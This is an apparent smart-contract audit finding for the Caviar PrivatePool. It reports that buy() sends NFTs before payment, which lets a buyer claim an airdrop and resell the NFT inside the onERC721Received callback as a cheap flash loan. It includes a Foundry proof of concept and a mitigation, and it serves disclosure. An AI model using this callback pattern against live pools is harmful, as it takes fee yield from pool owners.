## Tags

- bug
- 2 (Med Risk)
- high quality report
- primary issue
- selected for report
- sponsor acknowledged
- M-01

# [The buy function's mechanism enables users to acquire flash loans at a cheaper fee rate.](https://github.com/code-423n4/2023-04-caviar-findings/issues/885) 

# Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289
https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L240


# Vulnerability details

## Impact

The buy function's mechanism allows users to access flash loans at a lower fee cost, which could affect the pool owner's yield if users opt for it instead of flash loans.

## Proof of Concept

The buy function initially transfers the NFTs to the buyer before verifying and receiving payment. This mechanism creates an opportunity for users to access flash loans that are akin to flash swaps in Uniswap.

It is worth noting that this scenario is only viable in pools with ERC20 tokens since they do not necessitate upfront payment, unlike payable functions. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs.

A proof-of-concept (PoC) demonstrating this scenario is provided below:

```solidity
// @audit-info These are the default circumstances used by most of the tests:

PrivatePool public privatePool;

address baseToken = address(shibaInu);
address nft = address(milady);
uint128 virtualBaseTokenReserves = 100e6;
uint128 virtualNftReserves = 10e18;
uint16 feeRate = 1e2;
uint56 changeFee = 3e6;
bytes32 merkleRoot = bytes32(0);
address owner = address(this);

uint256[] tokenIds;
uint256[] tokenWeights;
PrivatePool.MerkleMultiProof proofs;
IStolenNftOracle.Message[] stolenNftProofs;

function setUp() public {
    privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
    privatePool.initialize(
            baseToken, nft, virtualBaseTokenReserves, virtualNftReserves, changeFee, feeRate, merkleRoot, true, false
    );
    deal(address(shibaInu), address(this), 2e6);

    // @audit-info Giving the pool 60 tokens to trade with
    deal(address(shibaInu), address(privatePool), 100e6);

    for (uint256 i = 0; i < 5; i++) {
        milady.mint(address(privatePool), i + 1);
    }
    assertEq(milady.balanceOf(address(privatePool)), 5, "Didn't mint 5 NFTs for some reason.");
}

function test_failBecauseOfDivisionBy0() public {

    for (uint256 i = 0; i < 5; i++) {
        tokenIds.push(i + 1);
    }

    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.buyQuote(5e18);

    shibaInu.approve(address(privatePool), netInputAmount);
    // @audit-info Trying to buy the 5 tokens present in the pool
    privatePool.buy(tokenIds, tokenWeights, proofs);
}

function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external override returns (bytes4) {
    // @audit-info Claim airdrop for the specific NFT here
    airdrop.claim(tokenId);

    // @audit-info Selling the NFT here
    uint[] memory _tokenIds = new uint[](1);
    _tokenIds[0] = tokenId;

    milady.approve(address(privatePool), tokenId);
    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.sellQuote(1e18);
         
    privatePool.sell(_tokenIds, tokenWeights, proofs, stolenNftProofs);
    return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
}
```

## Tools Used

Manual review, Foundry

## Recommended Mitigation Steps

Consider sending the NFTs after the funds have been received by the contract.